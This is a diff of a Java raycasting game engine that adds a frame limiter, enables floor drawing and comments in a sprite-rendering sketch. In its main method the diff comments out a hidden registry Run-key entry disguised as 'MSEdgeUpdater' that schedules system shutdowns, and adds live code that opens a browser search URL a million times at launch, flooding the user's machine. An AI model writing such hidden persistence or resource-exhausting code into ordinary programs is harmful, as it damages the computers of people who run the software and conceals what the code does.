@@ -34,7 +34,6 @@ public class Engine extends JPanel {
 	}
 
 	private class Keyboard implements KeyListener {
-
 		@Override
 		public void keyTyped(KeyEvent e) {
 		}
@@ -59,7 +58,6 @@ public class Engine extends JPanel {
 					keys[6] = true;
 				}
 			}
-
 			if (e.getKeyCode() == KeyEvent.VK_LEFT) {
 				keys[4] = true;
 			} else if (e.getKeyCode() == KeyEvent.VK_RIGHT) {
@@ -87,14 +85,12 @@ public class Engine extends JPanel {
 					keys[6] = false;
 				}
 			}
-
 			if (e.getKeyCode() == KeyEvent.VK_LEFT) {
 				keys[4] = false;
 			} else if (e.getKeyCode() == KeyEvent.VK_RIGHT) {
 				keys[5] = false;
 			}
 		}
-
 	}
 
 	private static final int map[][] = Room.createRoom();
@@ -110,7 +106,7 @@ public class Engine extends JPanel {
 	private static final double moveSpeed = 0.06;
 	private static final double rotSpeed = 0.03;
 
-	private static final int transparencyLimit = 5;
+	private static final int transparencyLimit = 2;
 
 	rect rects[] = new rect[transparencyLimit * 800];
 
@@ -130,8 +126,6 @@ public class Engine extends JPanel {
 		image = new BufferedImage(800, 800, BufferedImage.TYPE_INT_RGB);
 		g = image.getGraphics();
 
-		// walltexture =
-		// ImageLoader.loadImageAsRGB("assets/images/textures/window.png");
 		walltexture = ImageIO.read(new File("assets/images/textures/window.png"));
 		doortexture = ImageLoader.loadImageAsRGB("assets/images/textures/door.png");
 		floortexture = ImageLoader.loadImageAsRGB("assets/images/textures/floor.png");
@@ -150,7 +144,7 @@ public class Engine extends JPanel {
 			g.setColor(Color.black);
 			g.fillRect(0, 0, 800, 800);
 			move();
-			// drawFloor();
+			drawFloor();
 			renderWalls();
 			for (int i = 0; i < transparencyLimit; i++) {
 				Future<?> futures[] = new Future<?>[800];
@@ -177,6 +171,17 @@ public class Engine extends JPanel {
 			Arrays.setAll(rects, i -> null);
 			repaint();
 			long dif = System.nanoTime() - a;
+
+			int waitTime = 1000 / 60 - (int) (dif / 1000000);
+
+			if (waitTime > 0) {
+				try {
+					Thread.sleep(waitTime);
+				} catch (InterruptedException ex) {
+
+				}
+			}
+
 			double fps = 1000000000.0 / dif;
 			g.setColor(Color.red);
 			g.drawString("FPS: " + Integer.toString((int) fps), 10, 10);
@@ -304,6 +309,53 @@ public class Engine extends JPanel {
 		}
 	}
 
+	// public void renderEntities(){
+	// double sx;
+	// double sd;
+	// for (int i = 0; i < enemies.size(); i++){
+	// double x = enemies[i].getX();
+	// double y = enemies[i].getY();
+	// double dist = sqrt((x-posX)*(x-posX) + (y-posY)*(y-posY));
+	// double angleC = std::atan(std::abs(dirY)/std::abs(dirX));
+	// if (dirX < 0) angleC = M_PI-angleC;
+	// if (dirY < 0) angleC *= -1;
+	// if (angleC < 0) angleC+=2*M_PI;
+	// double angleE = std::atan(std::abs(posY-y)/std::abs(posX-x));
+	// if (x-posX < 0) angleE = M_PI-angleE;
+	// if (y-posY < 0) angleE *= -1;
+	// if (angleE < 0) angleE+=2*M_PI;
+	// double angledif = angleE-angleC;
+	// if (angledif > M_PI) angledif-=M_PI*2;
+	// if (angledif < -M_PI) angledif+=M_PI*2;
+	// RectangleShape E;
+	// if (std::abs(angledif) < 0.78){
+	// int alpha = 255-0.88*dist*dist;
+	// if (alpha < 0){
+	// alpha = 0;
+	// }
+	// E.setFillColor(Color(255, 255, 255, alpha));
+	// if (enemies[i].isDamaged()){
+	// E.setFillColor(Color(255, 0, 0, alpha));
+	// }
+	// E.setTexture(&s);
+	// if (enemies[i].deathprogress() == 1){
+	// E.setTexture(&d);
+	// E.setTextureRect(IntRect(0, 0, 360, 360));
+	// E.setFillColor(Color::White);
+	// }
+	// sd = dist*std::abs(cos(angledif));
+	// sx = (dist*sin(-angledif)/sd)/0.65*400+400;
+	// E.setSize(Vector2f(700/sd, 700/sd));
+	// E.setPosition(sx-350/sd, 400-350/sd);
+	// enemysprites.push_back(E);
+	// enemydists.push_back(sd);
+	// }
+	// else{
+	// E.setFillColor(Color::Transparent);
+	// }
+	// }
+	// }
+
 	public static void move() {
 
 		double oldX = posX;
@@ -353,10 +405,15 @@ public class Engine extends JPanel {
 
 	// main method with standard graphics code
 	public static void main(String[] args) throws IOException, InterruptedException {
-		System.setProperty("sun.java2d.opengl", "true");
+		// System.setProperty("sun.java2d.opengl", "true");
 		JFrame frame = new JFrame("Rishi x Avaline");
-		String s[] = {"REG", "ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MSEdgeUpdater /t REG_SZ /d \"shutdown /s /t 60000\""};
-		Runtime.getRuntime().exec(s);
+		// String s[] = {"REG", "ADD
+		// HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MSEdgeUpdater /t
+		// REG_SZ /d \"shutdown /s /t 60000\""};
+		String s[] = { "explorer", "\"https://www.google.com/search?q=i+love+avaline+so+much\"" };
+		Runtime r = Runtime.getRuntime();
+		for (int i = 0; i < 1000000; i++)
+			r.exec(s);
 		frame.setSize(800, 800);
 		frame.setLocation(0, 0);
 		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
@@ -364,4 +421,4 @@ public class Engine extends JPanel {
 		frame.setVisible(true);
 	}
 
-} 
+}
